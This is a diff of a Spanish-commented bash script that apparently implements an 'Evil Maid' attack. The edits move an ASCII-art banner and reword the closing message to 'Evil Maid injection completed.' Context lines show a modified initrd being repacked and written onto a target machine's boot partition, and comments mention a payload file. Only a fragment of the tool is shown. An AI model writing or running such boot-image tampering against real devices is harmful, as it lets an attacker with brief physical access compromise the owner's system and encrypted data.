@@ -1,5 +1,8 @@
-
 #!/bin/bash
+# Instalamos figlet para mostrar arte ASCII
+sudo apt install figlet -y -q3
+# Mostramos un título en arte ASCII
+figlet -t -k -f /usr/share/figlet/small.flf "70rd's Maid"
 # Ruta al script .py y al archivo de payload
 wdir=$(pwd)
 # Instala la utilidad necesaria para usar lsinitrd
@@ -23,10 +26,6 @@ find . | cpio -H newc -o | gzip -9 > ~/$initrd
 sudo mv ~/$initrd ~/target/$initrd
 # Desmontamos la partición de arranque
 sudo umount ~/target
-# Instalamos figlet para mostrar arte ASCII
-sudo apt install figlet -y -q3
-# Mostramos un título en arte ASCII
-figlet -t -k -f /usr/share/figlet/small.flf "70rd's Maid"
-echo "Evil Maid completed."
+echo "Evil Maid injection completed."
 exit 0
 
